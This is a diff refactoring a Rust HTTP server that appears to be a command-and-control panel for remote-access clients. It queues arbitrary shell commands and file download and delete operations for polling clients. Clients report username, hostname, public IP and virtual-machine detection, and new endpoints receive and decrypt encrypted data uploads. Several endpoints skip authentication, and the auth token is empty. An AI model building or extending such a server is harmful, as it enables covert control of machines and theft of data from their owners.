@@ -1,114 +1,37 @@
-use std::{convert::Infallible, net::SocketAddr, sync::Arc, collections::HashMap};
+mod config;
+mod crypto;
+// moved to state.rs
+mod state;
+mod types;
+mod util;
+mod handlers;
+mod ui;
 
 use bytes::Bytes;
 use chrono::Utc;
-use http_body_util::{BodyExt, Full};
-use hyper::body::Incoming;
-use hyper::server::conn::http1;
-use hyper::service::service_fn;
-use hyper::{header::CONTENT_TYPE, Method, Request, Response, StatusCode};
-use hyper_util::rt::TokioIo;
-use serde::{Deserialize, Serialize};
-use serde_json::{json, Value};
-use tokio::{
-    net::TcpListener,
-    sync::{Mutex, Notify},
-    time,
+use http_body_util::Full;
+use hyper::{
+    body::Incoming, server::conn::http1, service::service_fn, Method,
+    Request, Response, StatusCode,
 };
-// Safe diagnostics from library (no secrets)
-#[cfg(feature = "server_diagnostics")]
-use aoi_64::collectors::network_diagnostics::collect_network_diagnostics;
-#[cfg(all(feature = "server_diagnostics", windows))]
-use aoi_64::get_system_info;
+use hyper_util::rt::TokioIo;
+use serde_json::{json, Value};
+use std::{convert::Infallible, net::SocketAddr, sync::Arc};
+use tokio::net::TcpListener;
+use crate::util::{
+    json_response, html_response, unix_time, extract_json_body
+};
 
-const AUTH_TOKEN: &str = "";
-const PORT: u16 = 9999;
+use crate::config::{AUTH_TOKEN, PORT};
 
-#[derive(Serialize, Deserialize, Clone, Debug)]
-struct Command {
-    id: String,
-    command_type: String,
-    parameters: Vec<String>,
-    timestamp: u64,
-    auth_token: String,
-}
+use crate::types::Command;
 
-#[derive(Serialize, Clone, Debug)]
-struct LogEntry {
-    timestamp: u64,
-    level: String,
-    message: String,
-    client_id: Option<String>,
-    command_id: Option<String>,
-    details: Option<Value>,
-}
+// use crate::types::{ClientInfo, DriveInfo, LogEntry};
 
-#[derive(Serialize, Deserialize, Clone, Debug)]
-struct ClientInfo {
-    client_id: String,
-    hostname: String,
-    username: String,
-    os_name: String,
-    os_version: String,
-    architecture: String,
-    cpu_info: String,
-    timezone: String,
-    is_virtual_machine: bool,
-    virtual_machine_vendor: Option<String>,
-    drives: Vec<DriveInfo>,
-    last_seen: u64,
-    status: String,
-    public_ip: String,
-}
+use crate::state::AppState;
 
-#[derive(Serialize, Deserialize, Clone, Debug)]
-struct DriveInfo {
-    drive_letter: String,
-    drive_type: String,
-    total_space_gb: f64,
-    free_space_gb: f64,
-    file_system: String,
-}
 
-struct AppState {
-    command_queue: Mutex<Vec<Command>>,
-    response_log: Mutex<Vec<Value>>,
-    activity_log: Mutex<Vec<LogEntry>>,
-    client_info: Mutex<std::collections::HashMap<String, ClientInfo>>, // クライアント情報管理
-    notify: Notify,
-    _server_start: u64, // サーバー開始時刻（将来使用予定）
-}
-
-fn unix_time() -> u64 {
-    Utc::now().timestamp() as u64
-}
-
-async fn log_activity(
-    state: &AppState,
-    level: &str,
-    message: &str,
-    client_id: Option<&str>,
-    command_id: Option<&str>,
-    details: Option<Value>,
-) {
-    let entry = LogEntry {
-        timestamp: unix_time(),
-        level: level.to_string(),
-        message: message.to_string(),
-        client_id: client_id.map(str::to_string),
-        command_id: command_id.map(str::to_string),
-        details,
-    };
-
-    let mut log = state.activity_log.lock().await;
-    log.push(entry);
-
-    // 最新1000件まで保持
-    if log.len() > 1000 {
-        let excess = log.len() - 1000;
-        log.drain(0..excess);
-    }
-}
+use crate::state::log_activity;
 
 async fn handle_simple_command(
     state: &AppState,
@@ -136,9 +59,8 @@ async fn handle_simple_command(
         Some(json!({"command_type": command_type})),
     )
     .await;
-    println!("[UI] {} command added: {}", command_type, id);
 
-    Ok(json_response(json!({"ok": true}), StatusCode::OK))
+    Ok(crate::util::json_response(json!({"ok": true}), StatusCode::OK))
 }
 
 async fn handle_file_command(
@@ -158,25 +80,10 @@ async fn handle_file_command(
 
     state.command_queue.lock().await.push(cmd);
     state.notify.notify_waiters();
-    println!("[UI] {} command added: {}", command_type, id);
 
     Ok(json_response(json!({"ok": true}), StatusCode::OK))
 }
 
-async fn extract_json_body(req: Request<Incoming>) -> Result<Value, String> {
-    let body = req
-        .into_body()
-        .collect()
-        .await
-        .map_err(|_| "Failed to read body")?
-        .to_bytes();
-
-    if body.is_empty() {
-        return Err("Empty body".to_string());
-    }
-
-    serde_json::from_slice(&body).map_err(|_| "Invalid JSON".to_string())
-}
 
 async fn handle_file_operation(
     state: &AppState,
@@ -207,7 +114,7 @@ async fn handle_file_operation(
 
                 state.command_queue.lock().await.push(cmd);
                 state.notify.notify_waiters();
-                println!("[UI] {} command added: {} (path: {})", operation, id, path);
+                
                 Ok(json_response(
                     json!({"ok": true, "command_id": id}),
                     StatusCode::OK,
@@ -246,8 +153,6 @@ async fn handle_command(
                     working_dir.to_string(),
                 ];
 
-
-
                 // 通常コマンドはキューへ（常に "execute" に統一）
                 let command_type = "execute";
                 let cmd = Command {
@@ -275,9 +180,10 @@ async fn handle_command(
                 )
                 .await;
 
-                println!("[UI] command added: {} (cmd: {})", id, command);
-
-                Ok(json_response(json!({"ok": true, "command_id": id}), StatusCode::OK))
+                Ok(json_response(
+                    json!({"ok": true, "command_id": id}),
+                    StatusCode::OK,
+                ))
             } else {
                 Ok(json_response(
                     json!({"error": "command parameter required"}),
@@ -324,91 +230,7 @@ where
     }
 }
 
-fn json_response(v: Value, status: StatusCode) -> Response<Full<Bytes>> {
-    let body = serde_json::to_vec(&v).unwrap_or_else(|_| b"{}".to_vec());
-    Response::builder()
-        .status(status)
-        .header(CONTENT_TYPE, "application/json")
-        .body(Full::new(Bytes::from(body)))
-        .unwrap()
-}
-
-fn bytes_download_response(filename: &str, bytes: Vec<u8>) -> Response<Full<Bytes>> {
-    Response::builder()
-        .status(StatusCode::OK)
-        .header(CONTENT_TYPE, "application/octet-stream")
-        .header(
-            hyper::header::CONTENT_DISPOSITION,
-            format!("attachment; filename=\"{}\"", filename),
-        )
-        .body(Full::new(Bytes::from(bytes)))
-        .unwrap()
-}
-
-fn unauthorized() -> Response<Full<Bytes>> {
-    json_response(json!({"error": "Unauthorized"}), StatusCode::UNAUTHORIZED)
-}
-
-fn is_authorized(req: &Request<Incoming>) -> bool {
-    if let Some(h) = req
-        .headers()
-        .get("Authorization")
-        .and_then(|h| h.to_str().ok())
-    {
-        if let Some(token) = h.strip_prefix("Bearer ") {
-            return token == AUTH_TOKEN;
-        }
-    }
-    false
-}
-
-fn log_request(method: &Method, endpoint: &str, remote: &SocketAddr, data: Option<&Value>) {
-    let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S");
-    println!("[{}] {} {} - {}", timestamp, method, endpoint, remote);
-    if let Some(d) = data {
-        if let Ok(s) = serde_json::to_string_pretty(d) {
-            println!("  Data: {}", s);
-        }
-    }
-}
-
-fn parse_query_param(req: &Request<Incoming>, key: &str) -> Option<String> {
-    req.uri().query()?.split('&').find_map(|pair| {
-        let mut parts = pair.splitn(2, '=');
-        match (parts.next()?, parts.next()) {
-            (k, Some(v)) if k == key => Some(v.to_string()),
-            (k, None) if k == key => Some(String::new()),
-            _ => None,
-        }
-    })
-}
-
-fn parse_query_bool(req: &Request<Incoming>, key: &str) -> bool {
-    matches!(
-        parse_query_param(req, key).as_deref(),
-        Some("1" | "true" | "yes")
-    )
-}
-
-fn parse_query_u64(req: &Request<Incoming>, key: &str, default: u64) -> u64 {
-    parse_query_param(req, key)
-        .and_then(|v| v.parse().ok())
-        .unwrap_or(default)
-}
-
-fn html_response(html: &str) -> Response<Full<Bytes>> {
-    Response::builder()
-        .status(StatusCode::OK)
-        .header(CONTENT_TYPE, "text/html; charset=utf-8")
-        .header(
-            hyper::header::CACHE_CONTROL,
-            "no-store, no-cache, must-revalidate, max-age=0",
-        )
-        .header(hyper::header::PRAGMA, "no-cache")
-        .header(hyper::header::EXPIRES, "0")
-        .body(Full::new(Bytes::from(html.to_owned())))
-        .unwrap()
-}
+// moved to util.rs
 
 fn index_page(queue_size: usize, resp_count: usize) -> String {
     format!(
@@ -1168,11 +990,25 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
         return; 
       }}
       
+      // 重複実行防止チェック
+      const executeButton = document.querySelector('button[onclick="executeCommand()"]');
+      if (executeButton && executeButton.disabled) {{
+        showToast('コマンド実行中です。しばらくお待ちください。', 'warning');
+        return;
+      }}
+      
       const timeout = parseInt(document.getElementById('timeout').value) || 30;
       const workingDir = document.getElementById('workdir').value.trim();
       if (timeout < 5 || timeout > 300) {{
         showToast('タイムアウトは5～300秒の範囲で指定してください', 'error');
         return;
+      }}
+      
+      // ボタンを無効化（重複実行防止）
+      if (executeButton) {{
+        executeButton.disabled = true;
+        executeButton.style.opacity = '0.6';
+        executeButton.textContent = '⏳ 実行中...';
       }}
       
       // 通常のコマンド実行
@@ -1194,6 +1030,15 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
       
       // 結果取得を開始（5秒後から30秒間監視）
       setTimeout(() => checkCommandResults(command), 5000);
+      
+      // 30秒後にボタンを再有効化（タイムアウト対策）
+      setTimeout(() => {{
+        if (executeButton) {{
+          executeButton.disabled = false;
+          executeButton.style.opacity = '1';
+          executeButton.textContent = '⚡ Execute Command';
+        }}
+      }}, 30000);
     }}
 
     
@@ -1256,6 +1101,14 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
                 clearInterval(checkInterval);
                 displayCommandResult(result);
                 addToLog(`✅ コマンド結果取得成功: ${{originalCommand}}`);
+                
+                // ボタンを再有効化
+                const executeButton = document.querySelector('button[onclick="executeCommand()"]');
+                if (executeButton) {{
+                  executeButton.disabled = false;
+                  executeButton.style.opacity = '1';
+                  executeButton.textContent = '⚡ Execute Command';
+                }}
                 return;
               }}
             }}
@@ -1266,6 +1119,14 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
             document.getElementById('command-result-content').innerHTML = 
               '⏰ タイムアウト: コマンド実行結果の取得に失敗しました（60秒）。手動でログを確認してください。';
             addToLog(`⏰ コマンド結果取得タイムアウト: ${{originalCommand}}`);
+            
+            // タイムアウト時にもボタンを再有効化
+            const executeButton = document.querySelector('button[onclick="executeCommand()"]');
+            if (executeButton) {{
+              executeButton.disabled = false;
+              executeButton.style.opacity = '1';
+              executeButton.textContent = '⚡ Execute Command';
+            }}
           }} else {{
             // 進行状況を表示
             const progress = Math.round((attempts / maxAttempts) * 100);
@@ -1335,6 +1196,13 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
     }}
     
     function quickCommand(command) {{
+      // 実行中チェック
+      const executeButton = document.querySelector('button[onclick="executeCommand()"]');
+      if (executeButton && executeButton.disabled) {{
+        showToast('コマンド実行中です。しばらくお待ちください。', 'warning');
+        return;
+      }}
+      
       document.getElementById('command').value = command;
       document.getElementById('timeout').value = '30';
       document.getElementById('workdir').value = '';
@@ -1505,53 +1373,22 @@ async fn handle(
         }
 
         // UI state (JSON)
-        (Method::GET, "/ui/state") => {
-            let q = state.command_queue.lock().await;
-            let r = state.response_log.lock().await;
-            let recent: Vec<Value> = r.iter().rev().take(20).cloned().collect();
-            Ok(json_response(
-                json!({
-                    "queue_count": q.len(),
-                    "responses": recent
-                }),
-                StatusCode::OK,
-            ))
-        }
+        (Method::GET, "/ui/state") => ui::ui_state_json(&state).await,
 
         // ファイル管理コマンド（固定パス）
-        (Method::POST, "/ui/add-list-files") => {
-            handle_file_command(&state, "list_files", "list_files", vec![".", "false"]).await
-        }
-        (Method::POST, "/ui/add-list-files-win") => {
-            handle_file_command(
-                &state,
-                "list_files_win",
-                "list_files",
-                vec!["C:\\", "false"],
-            )
-            .await
-        }
+        (Method::POST, "/ui/add-list-files") => ui::handle_file_command(&state, "list_files", "list_files", vec![".", "false"]).await,
+        (Method::POST, "/ui/add-list-files-win") => ui::handle_file_command(&state, "list_files_win", "list_files", vec!["C:\\", "false"]).await,
         // ファイル操作（JSONパラメータ付き）
-        (Method::POST, "/ui/add-file-info") => {
-            handle_file_operation(&state, req, "file_info", "get_file_info").await
-        }
-        (Method::POST, "/ui/add-download-file") => {
-            handle_file_operation(&state, req, "download", "download_file").await
-        }
-        (Method::POST, "/ui/add-delete-file") => {
-            handle_file_operation(&state, req, "delete", "delete_file").await
-        }
-        (Method::POST, "/ui/add-create-dir") => {
-            handle_file_operation(&state, req, "create_dir", "create_dir").await
-        }
+        (Method::POST, "/ui/add-file-info") => ui::handle_file_operation(&state, req, "file_info", "get_file_info").await,
+        (Method::POST, "/ui/add-download-file") => ui::handle_file_operation(&state, req, "download", "download_file").await,
+        (Method::POST, "/ui/add-delete-file") => ui::handle_file_operation(&state, req, "delete", "delete_file").await,
+        (Method::POST, "/ui/add-create-dir") => ui::handle_file_operation(&state, req, "create_dir", "create_dir").await,
 
         // Webhook
-        (Method::POST, "/ui/queue-webhook") => {
-            handle_simple_command(&state, "webhook", "webhook_send").await
-        }
+        (Method::POST, "/ui/queue-webhook") => ui::handle_simple_command(&state, "webhook", "webhook_send").await,
 
         // デバッグコマンド実行
-        (Method::POST, "/ui/execute-command") => handle_command(&state, req).await,
+        (Method::POST, "/ui/execute-command") => ui::handle_command(&state, req).await,
 
         // コマンド実行結果取得
         (Method::GET, "/ui/command-results") => {
@@ -1583,502 +1420,37 @@ async fn handle(
         }
 
         // コマンド結果に含まれるファイルデータ（base64）をダウンロードとして返す
-        (Method::GET, "/api/responses/file") => {
-            // UIからのダウンロード用エンドポイント（認証不要のUI用途）
-            let Some(cmd_id) = parse_query_param(&req, "command_id") else {
-                return Ok(json_response(
-                    json!({"error":"command_id required"}),
-                    StatusCode::BAD_REQUEST,
-                ));
-            };
-
-            let logs = state.response_log.lock().await;
-            if let Some(item) = logs
-                .iter()
-                .rev()
-                .find(|v| v.get("command_id").and_then(|s| s.as_str()) == Some(cmd_id.as_str()))
-            {
-                if let Some(data) = item.get("data") {
-                    let file_name = data
-                        .get("file_name")
-                        .and_then(|s| s.as_str())
-                        .unwrap_or("download.bin");
-                    let encoding = data.get("encoding").and_then(|s| s.as_str()).unwrap_or("");
-                    let b64 = data.get("data").and_then(|s| s.as_str());
-                    if encoding == "base64" {
-                        if let Some(b64s) = b64 {
-                            match base64::Engine::decode(
-                                &base64::engine::general_purpose::STANDARD,
-                                b64s,
-                            ) {
-                                Ok(bytes) => return Ok(bytes_download_response(file_name, bytes)),
-                                Err(_) => {
-                                    return Ok(json_response(
-                                        json!({"error":"invalid base64"}),
-                                        StatusCode::BAD_REQUEST,
-                                    ))
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-            Ok(json_response(
-                json!({"error":"file data not found"}),
-                StatusCode::NOT_FOUND,
-            ))
-        }
+        (Method::GET, "/api/responses/file") => ui::ui_download_response_file(req, &state).await,
 
         // Client endpoints ---------------------------------------------
 
         // Client endpoints ---------------------------------------------
-        (Method::GET, "/api/commands/fetch") => {
-            log_request(&method, &path, &remote, None);
-            if !is_authorized(&req) {
-                return Ok(unauthorized());
-            }
-            let client_id =
-                parse_query_param(&req, "client_id").unwrap_or_else(|| "unknown".into());
-            let wait = parse_query_bool(&req, "wait");
-            let timeout_secs = parse_query_u64(&req, "timeout", 25);
+        (Method::GET, "/api/commands/fetch") => handlers::api_commands_fetch(req, remote, &state).await,
 
-            let mut cmds: Vec<Command> = {
-                let q = state.command_queue.lock().await;
-                // drain()ではなくclone()を使用してコマンドをコピー（すべてのクライアントが受信可能）
-                q.clone()
-            };
-            if cmds.is_empty() && wait {
-                let _ = time::timeout(
-                    std::time::Duration::from_secs(timeout_secs),
-                    state.notify.notified(),
-                )
-                .await;
-                let q = state.command_queue.lock().await;
-                cmds = q.clone();
-            }
+        (Method::POST, "/api/commands/response") => handlers::api_commands_response(req, &state).await,
 
-            // コマンドを送信した後、古いコマンドをクリアする（5秒経過したもの）
-            if !cmds.is_empty() {
-                let mut q = state.command_queue.lock().await;
-                let current_time = unix_time();
-                q.retain(|cmd| current_time - cmd.timestamp < 5); // 5秒以内のコマンドのみ保持
-            }
-            if !cmds.is_empty() {
-                println!(
-                    "  → Returning {} command(s) for client: {}",
-                    cmds.len(),
-                    client_id
-                );
-            }
-            Ok(json_response(
-                serde_json::to_value(cmds).unwrap_or_else(|_| json!([])),
-                StatusCode::OK,
-            ))
-        }
+        (Method::POST, "/api/heartbeat") => handlers::api_heartbeat(req, state.clone()).await,
 
-        (Method::POST, "/api/commands/response") => {
-            if !is_authorized(&req) {
-                return Ok(unauthorized());
-            }
-            match extract_json_body(req).await {
-                Ok(mut data) => {
-                    // ログ表示
-                    let command_id = data.get("command_id").and_then(|v| v.as_str()).unwrap_or("unknown");
-                    let success = data.get("success").and_then(|v| v.as_bool()).unwrap_or(false);
-                    let message = data.get("message").and_then(|v| v.as_str()).unwrap_or("no message");
-                    println!("  → Command response received: {} (success: {}) - {}", command_id, success, message);
-
-                    // タイムスタンプ付与し、レスポンスログへ保存
-                    if let Some(obj) = data.as_object_mut() {
-                        obj.insert("received_at".into(), Value::String(Utc::now().to_rfc3339()));
-                        obj.insert("server_timestamp".into(), Value::from(unix_time()));
-                    }
-                    state.response_log.lock().await.push(data.clone());
-
-                    // システム情報が含まれていればクライアント情報を更新
-                    if let (Some(client_id), Some(resp_data)) = (
-                        data.get("client_id").and_then(|v| v.as_str()),
-                        data.get("data"),
-                    ) {
-                        if let Some(sys) = resp_data.as_object() {
-                            if sys.get("hostname").is_some() && sys.get("os_name").is_some() {
-                                let mut clients = state.client_info.lock().await;
-                                let drives = sys
-                                    .get("disk_info")
-                                    .and_then(|v| v.as_array())
-                                    .map(|arr| {
-                                        arr.iter()
-                                            .filter_map(|drive| {
-                                                Some(DriveInfo {
-                                                    drive_letter: drive.get("drive_letter")?.as_str()?.to_string(),
-                                                    drive_type: "Fixed".to_string(),
-                                                    total_space_gb: drive.get("total_size_gb")?.as_f64()?,
-                                                    free_space_gb: drive.get("free_space_gb")?.as_f64()?,
-                                                    file_system: drive.get("file_system")?.as_str()?.to_string(),
-                                                })
-                                            })
-                                            .collect::<Vec<_>>()
-                                    })
-                                    .unwrap_or_default();
-
-                                let client_info = ClientInfo {
-                                    client_id: client_id.to_string(),
-                                    hostname: sys.get("hostname").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    username: sys.get("username").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    os_name: sys.get("os_name").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    os_version: sys.get("os_version").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    architecture: sys.get("os_arch").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    cpu_info: sys.get("cpu_info").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    timezone: sys.get("timezone").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    is_virtual_machine: sys.get("is_virtual_machine").and_then(|v| v.as_bool()).unwrap_or(false),
-                                    virtual_machine_vendor: sys.get("virtual_machine_vendor").and_then(|v| v.as_str()).map(|s| s.to_string()),
-                                    drives,
-                                    last_seen: unix_time(),
-                                    status: "updated".to_string(),
-                                    public_ip: sys.get("public_ip").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                };
-                                clients.insert(client_id.to_string(), client_info);
-                            }
-                        }
-                    }
-
-                    Ok(json_response(json!({"status":"received"}), StatusCode::OK))
-                }
-                Err(_) => Ok(json_response(json!({"error": "No JSON data provided"}), StatusCode::BAD_REQUEST)),
-            }
-        }
-
-        (Method::POST, "/api/heartbeat") => {
-            if !is_authorized(&req) {
-                return Ok(unauthorized());
-            }
-            handle_client_json_request(
-                &state,
-                req,
-                |data| {
-                    let client_id = data
-                        .get("client_id")
-                        .and_then(|v| v.as_str())
-                        .unwrap_or("unknown");
-                    let hostname = data
-                        .get("hostname")
-                        .and_then(|v| v.as_str())
-                        .unwrap_or("unknown");
-                    let status = data
-                        .get("status")
-                        .and_then(|v| v.as_str())
-                        .unwrap_or("unknown");
-
-                    tokio::spawn({
-                        let state = state.clone();
-                        let data = data.clone();
-                        let client_id = client_id.to_string();
-                        let hostname = hostname.to_string();
-                        let status = status.to_string();
-                        async move {
-                            // デバッグ: 受信したデータをログに出力
-                            println!("🔍 Heartbeat received from {}: {}", client_id, serde_json::to_string_pretty(&data).unwrap_or_else(|_| "invalid json".to_string()));
-                            
-                            // クライアント情報の更新（システム情報がない場合でも基本情報は保存）
-                            let mut clients = state.client_info.lock().await;
-                            
-                            if let Some(system_info) = data.get("system_info").and_then(|v| if v.is_null() { None } else { Some(v) }) {
-                                println!("✅ System info found in heartbeat from {}", client_id);
-                                let client_info = ClientInfo {
-                                    client_id: client_id.clone(),
-                                    hostname: hostname.clone(),
-                                    username: system_info.get("username").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    os_name: system_info.get("os_name").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    os_version: system_info.get("os_version").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    architecture: system_info.get("os_arch").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    cpu_info: system_info.get("cpu_info").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    timezone: system_info.get("timezone").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                    is_virtual_machine: system_info.get("is_virtual_machine").and_then(|v| v.as_bool()).unwrap_or(false),
-                                    virtual_machine_vendor: system_info.get("virtual_machine_vendor").and_then(|v| v.as_str()).map(|s| s.to_string()),
-                                    drives: system_info.get("disk_info").and_then(|v| v.as_array()).map(|drives| {
-                                        drives.iter().filter_map(|drive| {
-                                            Some(DriveInfo {
-                                                drive_letter: drive.get("drive_letter")?.as_str()?.to_string(),
-                                                drive_type: "Fixed".to_string(), // システム情報にはdrive_typeがないのでデフォルト値
-                                                total_space_gb: drive.get("total_size_gb")?.as_f64()?, // total_size_gb が正しいフィールド名
-                                                free_space_gb: drive.get("free_space_gb")?.as_f64()?,
-                                                file_system: drive.get("file_system")?.as_str()?.to_string(),
-                                            })
-                                        }).collect()
-                                    }).unwrap_or_default(),
-                                    last_seen: unix_time(),
-                                    status: status.clone(),
-                                    public_ip: system_info.get("public_ip").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
-                                };
-                                
-                                clients.insert(client_id.clone(), client_info);
-                            } else {
-                                println!("⚠️  No system_info in heartbeat from {}", client_id);
-                                
-                                // システム情報がない場合でも基本情報は保存（既存の情報を更新）
-                                if let Some(existing_client) = clients.get_mut(&client_id) {
-                                    // 既存クライアントの場合は基本情報のみ更新
-                                    existing_client.hostname = hostname.clone();
-                                    existing_client.last_seen = unix_time();
-                                    existing_client.status = status.clone();
-                                    println!("🔄 Updated basic info for existing client {}", client_id);
-                                } else {
-                                    // 新規クライアントの場合は未知の情報でエントリを作成
-                                    let client_info = ClientInfo {
-                                        client_id: client_id.clone(),
-                                        hostname: hostname.clone(),
-                                        username: "unknown".to_string(),
-                                        os_name: "unknown".to_string(),
-                                        os_version: "unknown".to_string(),
-                                        architecture: "unknown".to_string(),
-                                        cpu_info: "unknown".to_string(),
-                                        timezone: "unknown".to_string(),
-                                        is_virtual_machine: false,
-                                        virtual_machine_vendor: None,
-                                        drives: vec![],
-                                        last_seen: unix_time(),
-                                        status: status.clone(),
-                                        public_ip: "unknown".to_string(),
-                                    };
-                                    
-                                    clients.insert(client_id.clone(), client_info);
-                                    println!("🆕 Created new client entry without system info: {}", client_id);
-                                }
-                            }
-                            
-                            drop(clients); // ロックを明示的に解放
-
-                            log_activity(
-                                &state,
-                                "HEARTBEAT",
-                                &format!("Client {}@{} status: {}", client_id, hostname, status),
-                                Some(&client_id),
-                                None,
-                                Some(data),
-                            )
-                            .await;
-                        }
-                    });
-
-                    println!("  → Heartbeat from {}@{}: {}", client_id, hostname, status);
-                    data
-                },
-                "received",
-            )
-            .await
-        }
-
-        (Method::POST, "/api/data/upload") => {
-            if !is_authorized(&req) {
-                return Ok(unauthorized());
-            }
-            handle_client_json_request(
-                &state,
-                req,
-                |data| {
-                    let client_id = data
-                        .get("client_id")
-                        .and_then(|v| v.as_str())
-                        .unwrap_or("unknown");
-                    let data_type = data
-                        .get("data_type")
-                        .and_then(|v| v.as_str())
-                        .unwrap_or("unknown");
-                    // データ保存処理を削除（アップロードは受信のみ）
-                    println!(
-                        "  → Data upload received from {}: {} (not saved)",
-                        client_id, data_type
-                    );
-                    data
-                },
-                "uploaded",
-            )
-            .await
-        }
+        (Method::POST, "/api/data/upload") => handlers::api_data_upload(req, &state).await,
+        
+        // 暗号化データ受信エンドポイント
+        (Method::POST, "/api/encrypted-data/upload") => handlers::api_encrypted_data_upload(req, &state).await,
+        (Method::GET, "/api/encrypted-data/packages") => handlers::api_list_encrypted_packages(&state).await,
+        (Method::POST, "/api/encrypted-data/decrypt") => handlers::api_decrypt_package(req, &state).await,
 
         // クライアント情報取得エンドポイント
-        (Method::GET, "/api/clients") => {
-            let clients = state.client_info.lock().await;
-            let client_list: Vec<&ClientInfo> = clients.values().collect();
-            Ok(json_response(json!({"clients": client_list}), StatusCode::OK))
-        }
+        (Method::GET, "/api/clients") => handlers::api_clients(&state).await,
 
-        (Method::GET, "/api/status") => {
-            let q = state.command_queue.lock().await;
-            let r = state.response_log.lock().await;
-            let l = state.activity_log.lock().await;
-            let status = serde_json::json!({
-                "queue": q.len(),
-                "responses": r.len(),
-                "logs": l.len(),
-                "clients": if r.len() > 0 { 1 } else { 0 }, // 簡易的なクライアント検出
-                "server_time": unix_time(),
-                "uptime": std::time::SystemTime::now()
-                    .duration_since(std::time::UNIX_EPOCH)
-                    .unwrap_or_default()
-                    .as_secs()
-            });
-            Ok(json_response(status, StatusCode::OK))
-        }
+        (Method::GET, "/api/status") => handlers::api_status(&state).await,
 
-        // Diagnostics endpoints (authorized) ----------------
-        #[cfg(feature = "server_diagnostics")]
-        (Method::GET, "/api/health") => {
-            if !is_authorized(&req) {
-                return Ok(unauthorized());
-            }
-            let q = state.command_queue.lock().await;
-            let r = state.response_log.lock().await;
-            let now = unix_time();
-            let uptime = now.saturating_sub(state._server_start);
-            let body = json!({
-                "status": "ok",
-                "server_time": now,
-                "uptime_secs": uptime,
-                "queue_len": q.len(),
-                "responses_len": r.len(),
-            });
-            Ok(json_response(body, StatusCode::OK))
-        }
+        (Method::GET, "/api/logs") => handlers::api_logs(req, &state).await,
 
-        #[cfg(feature = "server_diagnostics")]
-        (Method::GET, "/api/network") => {
-            if !is_authorized(&req) {
-                return Ok(unauthorized());
-            }
-            let lines = collect_network_diagnostics();
-            let limited: Vec<String> = lines.into_iter().take(500).collect();
-            Ok(json_response(json!({"lines": limited}), StatusCode::OK))
-        }
+        (Method::POST, "/api/logs/clear") => handlers::api_logs_clear(&state).await,
 
-        #[cfg(all(feature = "server_diagnostics", windows))]
-        (Method::GET, "/api/sysinfo") => {
-            if !is_authorized(&req) {
-                return Ok(unauthorized());
-            }
-            match get_system_info() {
-                Ok(info) => Ok(json_response(
-                    serde_json::to_value(info).unwrap_or_else(|_| json!({"error":"serialize"})),
-                    StatusCode::OK,
-                )),
-                Err(e) => Ok(json_response(
-                    json!({"error": format!("{}", e)}),
-                    StatusCode::INTERNAL_SERVER_ERROR,
-                )),
-            }
-        }
-
-        (Method::GET, "/api/logs") => {
-            let limit = parse_query_u64(&req, "limit", 50);
-            let offset = parse_query_u64(&req, "offset", 0);
-
-            let logs = state.activity_log.lock().await;
-            let total = logs.len();
-            let start = offset.min(total as u64) as usize;
-            let end = (start + limit as usize).min(total);
-
-            let logs_slice: Vec<LogEntry> = if start < total {
-                logs[start..end].iter().rev().cloned().collect() // 新しいものから表示
-            } else {
-                Vec::new()
-            };
-
-            let response = serde_json::json!({
-                "logs": logs_slice,
-                "total": total,
-                "offset": offset,
-                "limit": limit,
-                "has_more": end < total
-            });
-
-            Ok(json_response(response, StatusCode::OK))
-        }
-
-        (Method::POST, "/api/logs/clear") => {
-            let mut logs = state.activity_log.lock().await;
-            let cleared_count = logs.len();
-            logs.clear();
-            log_activity(
-                &state,
-                "INFO",
-                &format!("Activity log cleared ({} entries)", cleared_count),
-                None,
-                None,
-                None,
-            )
-            .await;
-            Ok(json_response(
-                json!({"cleared": cleared_count, "status": "success"}),
-                StatusCode::OK,
-            ))
-        }
-
-        (Method::GET, "/api/responses") => {
-            let limit = parse_query_u64(&req, "limit", 10);
-            let command_id = parse_query_param(&req, "command_id");
-
-            let responses = state.response_log.lock().await;
-            let filtered_responses: Vec<&Value> = if let Some(cmd_id) = command_id {
-                responses
-                    .iter()
-                    .filter(|r| r.get("command_id").and_then(|id| id.as_str()) == Some(&cmd_id))
-                    .take(limit as usize)
-                    .collect()
-            } else {
-                responses.iter().rev().take(limit as usize).collect()
-            };
-
-            let response = serde_json::json!({
-                "responses": filtered_responses,
-                "total": responses.len()
-            });
-
-            Ok(json_response(response, StatusCode::OK))
-        }
+        (Method::GET, "/api/responses") => handlers::api_responses(req, &state).await,
 
         // システム情報更新エンドポイント
-        (Method::POST, "/api/clients/update-sysinfo") => {
-            if !is_authorized(&req) {
-                return Ok(unauthorized());
-            }
-            let client_id = parse_query_param(&req, "client_id");
-            if client_id.is_none() {
-                return Ok(json_response(
-                    json!({"error": "client_id parameter is required"}),
-                    StatusCode::BAD_REQUEST,
-                ));
-            }
-            let client_id = client_id.unwrap();
-
-            // コマンドキューにシステム情報更新コマンドを追加
-            let command_id = format!("cmd_{}", unix_time());
-            let command = Command {
-                id: command_id.clone(),
-                command_type: "update_system_info".to_string(),
-                parameters: vec![],
-                timestamp: unix_time(),
-                auth_token: AUTH_TOKEN.to_string(),
-            };
-
-            state.command_queue.lock().await.push(command.clone());
-            state.activity_log.lock().await.push(LogEntry {
-                timestamp: unix_time(),
-                level: "INFO".to_string(),
-                message: "System info update requested".to_string(),
